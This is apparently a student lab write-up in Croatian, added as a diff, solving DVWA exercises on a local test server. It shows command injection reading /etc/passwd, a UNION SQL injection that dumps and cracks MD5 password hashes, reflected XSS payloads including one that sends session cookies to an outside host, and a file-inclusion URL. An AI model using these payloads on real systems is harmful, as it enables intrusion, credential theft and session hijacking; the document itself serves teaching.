@@ -1,0 +1,95 @@
+1.
+
+Otvaramo terminal i upisujemo 1 jer se to percipira kao True i | je pipe koji povezuje druge naredbe. Cat služi za ispis sadržaja datoteke koja se nalazi
+na putanji /etc/passwd koja je standardna za lozinke unutar linux okruženja. 
+
+1 | cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+2. 
+
+Za dešifriranje je korištena crackstation.net stranica u koju su uneseni hashevi i automatski je prepoznato da je to MD5 te je na temelju toga
+dobivena stvarna lozinka. MD5 je davno probijen i zato je ovdje idealna prilika za isprobavanje.
+https://crackstation.net/
+
+srs' union select first_name,  password from users where user_id ='srs 
+
+Za Pabla lozinka je letmein prikazana dolje. 
+Ispisani su svi elementi za brži odabir, nisu filtrirani.
+
+ID: srs' UNION SELECT first_name, password FROM users WHERE user_id ='srs' 
+First name: Pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+5f4dcc3b5aa765d61d8327deb882cf99	md5	password
+
+First name: Gordon
+Surname: e99a18c428cb38d5f260853678922e03
+e99a18c428cb38d5f260853678922e03	md5	abc123
+
+First name: Hack
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+8d3533d75ae2c3966d7e0d4fcc69216b	md5	charley
+
+First name: Pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+0d107d09f5bbe40cade3de5c71e9e9b7	md5	letmein
+
+First name: Bob
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+5f4dcc3b5aa765d61d8327deb882cf99	md5	password
+
+3. 
+
+Kao korisničko ime koristimo srs. 
+Tipični JS napadi temelje se na injektiranju koda. 
+To se radi tako da se unutar <script> tagova umetne alert koji služi za ispis. 
+Pomoću naredbe document.cookie dohvaćamo kolačić koji želimo ispisati.
+JS je weakly typed pa je lako ubacivati maliciozne kodove unutar bilokojeg polja za unos.
+Isto tako potrebno je postaviti security=low. 
+Dohvaćeni kolačić je ima vrijednost 41o3pn2oalmkb5qmf1sbogh427
+Pomoću alata Inspect element imamo mogućnost promjene parametra maxLength i tako zaobići maksimalni broj znakova.
+
+srs
+<script>alert(document.cookie)</script>
+PHPSESSID=41o3pn2oalmkb5qmf1sbogh427; 
+
+srs
+<script>document.location.href='http://public.tel.fer.hr/srs/cookie=?'+document.cookie</script>
+
+Ne radi kao plaintext jer http zamijeni znakove npr umjesto name=%xy sa < pa treba pogledati u history gdje odvede.
+
+172.17.0.2/vulnerabilities/xss_r/
+?name=<script>document.location.href='http://public.tel.fer.hr/srs/cookie=?'+document.cookie</script>
+
+
+4.
+
+Unutar linka potrebno je dodati /etc/passwd (opet putanja od lozinki u linux okruženju)
+Dodan je i screenshot.
+
+http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd
+
+Kako bi spriječili ovaj napad potrebno je postaviti ograničenja pristupa datoteci.
